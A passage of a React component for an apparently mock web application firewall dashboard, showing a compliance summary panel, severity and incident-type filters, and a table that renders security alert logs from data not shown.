                      <p className="font-bold text-xs">No active IP blockades in Web Application Firewall memory.</p>
                      <p className="text-[11px]">Deploy new firewall blocks using the buttons above.</p>
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* INTEGRATION REPORT PORTLET */}
        <div className="bg-gradient-to-br from-navy-950 to-navy-900 text-white rounded-2xl p-5 border border-navy-800 shadow-md flex flex-col justify-between">
          <div className="space-y-4">
            <div className="flex items-center gap-2 border-b border-navy-800 pb-3">
              <ShieldCheck className="w-5 h-5 text-gold-500" />
              <h3 className="text-xs font-black uppercase tracking-wider text-gold-400 font-sans">WAF Compliance Integrity</h3>
            </div>

            <div className="space-y-4 text-xs font-sans leading-relaxed text-gray-300">
              <div className="flex justify-between border-b border-navy-800/60 pb-2">
                <span>Compliance Code:</span>
                <span className="font-mono font-bold text-emerald-400">ISO-27001 / GDPR</span>
              </div>
              <div className="flex justify-between border-b border-navy-800/60 pb-2">
                <span>WAF Filtering Engine:</span>
                <span className="font-mono font-bold text-emerald-400">ModSecurity 3.0</span>
              </div>
              <div className="flex justify-between border-b border-navy-800/60 pb-2">
                <span>SQLi Signatures:</span>
                <span className="font-mono font-bold text-emerald-400">Active (45 Rules)</span>
              </div>
              <div className="flex justify-between border-b border-navy-800/60 pb-2">
                <span>XSS Cleaners:</span>
                <span className="font-mono font-bold text-emerald-400">Enabled (DOMPurify)</span>
              </div>
              <div className="flex justify-between pb-1">
                <span>Rate limiting limit:</span>
                <span className="font-mono font-bold text-royal-400">100 req/sec IP lock</span>
              </div>
            </div>

            <div className="p-3 bg-navy-900/60 rounded-xl border border-navy-800 text-[11px] text-gray-400">
              <b>Firewall Tip:</b> The database automatically strips invalid SQL sequences from CAPS query requests in South Africa's curriculum databases to guarantee high security.
            </div>
          </div>

          <button
            onClick={() => alert("Comprehensive PDF security audit compiled successfully and downloaded to your SRE environment.")}
            className="w-full py-2 bg-gradient-to-r from-royal-600 to-royal-700 text-white rounded-xl text-xs font-black uppercase font-mono tracking-wider flex items-center justify-center gap-2 shadow cursor-pointer hover:scale-[1.02] transition-all pt-3 mt-4"
          >
            <Download className="w-4 h-4 text-gold-300" />
            Download Compliance PDF
          </button>
        </div>

      </div>

      {/* FILTER SEARCH CRITERIA */}
      <div className="bg-white dark:bg-navy-900 border border-navy-150 dark:border-navy-800 rounded-2xl p-5 shadow-sm space-y-4">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-navy-100 dark:border-navy-800 pb-3">
          <div className="space-y-0.5">
            <h3 className="text-sm font-black text-navy-900 dark:text-white uppercase font-mono flex items-center gap-2">
              <Filter className="w-4 h-4 text-royal-500" />
              Auditable Telemetry Attack Logs
            </h3>
            <p className="text-xs text-navy-500 dark:text-navy-400">
              Historical and real-time security events captured by mod_security. Query by endpoints, parameters, or origin IPs.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <div className="relative">
              <Search className="w-3.5 h-3.5 text-navy-400 absolute left-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                placeholder="Search IP, endpoint..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pl-9 pr-3 py-1.5 bg-navy-50 dark:bg-navy-950 text-navy-900 dark:text-white border border-navy-200 dark:border-navy-800 rounded-lg text-xs font-bold w-48 focus:ring-1 focus:ring-royal-500 font-mono"
              />
            </div>

            <select
              value={filterSeverity}
              onChange={(e) => setFilterSeverity(e.target.value)}
              className="p-1.5 bg-navy-50 dark:bg-navy-950 text-navy-900 dark:text-white border border-navy-200 dark:border-navy-800 rounded-lg text-xs font-bold"
            >
              <option value="all">All Severities</option>
              <option value="low">Low Risk</option>
              <option value="medium">Medium Risk</option>
              <option value="high">High Risk</option>
              <option value="critical">Critical</option>
            </select>

            <select
              value={filterType}
              onChange={(e) => setFilterType(e.target.value)}
              className="p-1.5 bg-navy-50 dark:bg-navy-950 text-navy-900 dark:text-white border border-navy-200 dark:border-navy-800 rounded-lg text-xs font-bold"
            >
              <option value="all">All Incident Types</option>
              <option value="failed_login">Authentication Failure</option>
              <option value="rate_limit">Rate Limit Violations</option>
              <option value="sqli_attempt">SQL Injection attempts</option>
              <option value="xss_attempt">XSS Script Blockades</option>
            </select>
          </div>
        </div>

        {/* LOGS LISTING TABLE */}
        <div className="overflow-x-auto">
          <table className="w-full text-xs text-left text-navy-700 dark:text-navy-300 divide-y divide-navy-100 dark:divide-navy-800">
            <thead>
              <tr className="bg-navy-50/50 dark:bg-navy-950/20 text-[10px] font-mono font-black text-navy-400 uppercase tracking-wider">
                <th className="p-3">Reference ID</th>
                <th className="p-3">Timestamp</th>
                <th className="p-3">Security Event Type</th>
                <th className="p-3">Host / Source</th>
                <th className="p-3">Severity</th>
                <th className="p-3">Payload Sample</th>
                <th className="p-3">Status</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-navy-100 dark:divide-navy-800">
              {filteredAlerts.map((a, idx) => (
                <tr key={idx} className="hover:bg-navy-50/20 dark:hover:bg-navy-950/10 font-mono text-[11px]">
                  <td className="p-3 font-bold text-navy-900 dark:text-white">{a.id}</td>
                  <td className="p-3 text-navy-500 font-sans">{new Date(a.timestamp).toLocaleTimeString()}</td>
                  <td className="p-3">
                    <span className="font-sans font-bold text-navy-800 dark:text-white uppercase tracking-wider text-[10px]">
                      {a.type.replace("_", " ")}
                    </span>
                  </td>
                  <td className="p-3">
                    <div className="space-y-0.5">
                      <span className="font-bold text-navy-950 dark:text-navy-200 block">{a.ipAddress}</span>
                      <span className="text-[10px] font-sans font-semibold text-navy-500 flex items-center gap-1">
                        <Globe className="w-3 h-3 text-navy-400" />
                        {a.location}
                      </span>
                    </div>
                  </td>
                  <td className="p-3">
                    <span className={`px-2 py-0.5 rounded-full font-sans text-[9px] font-black uppercase ${
                      a.severity === "critical"
                        ? "bg-red-500/20 text-red-700 dark:text-red-400"
                        : a.severity === "high"
                        ? "bg-orange-500/20 text-orange-700 dark:text-orange-400"
                        : a.severity === "medium"
                        ? "bg-amber-500/20 text-amber-700 dark:text-amber-400"
                        : "bg-emerald-500/20 text-emerald-700 dark:text-emerald-400"
                    }`}>
                      {a.severity}
                    </span>
                  </td>
                  <td className="p-3 max-w-[200px] truncate">
                    <code className="text-[10.5px] text-purple-600 dark:text-purple-400 bg-purple-500/5 px-1.5 py-0.5 rounded block truncate" title={a.payload}>
                      {a.payload || "N/A"}
                    </code>
                    <span className="text-[9px] text-navy-400 block truncate mt-0.5">Target: {a.targetEndpoint}</span>
                  </td>
                  <td className="p-3">
                    <span className={`px-1.5 py-0.5 rounded text-[9.5px] font-bold uppercase font-mono ${
                      a.status === "blocked"
                        ? "bg-red-100 dark:bg-red-950/40 text-red-800 dark:text-red-400"
                        : a.status === "mitigated"
                        ? "bg-emerald-100 dark:bg-emerald-950/40 text-emerald-800 dark:text-emerald-400"
                        : "bg-amber-100 dark:bg-amber-950/40 text-amber-800 dark:text-amber-400"
                    }`}>
                      {a.status}
                    </span>
                  </td>
                </tr>
              ))}
              {filteredAlerts.length === 0 && (
                <tr>
                  <td colSpan={7} className="p-8 text-center text-navy-400 font-sans">
                    <AlertCircle className="w-8 h-8 text-navy-300 mx-auto mb-2" />
                    <p className="font-bold text-xs">No matching attack log telemetry entries found.</p>
                    <p className="text-[11px]">Clear search filters or trigger manual threat injectors above.</p>
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};
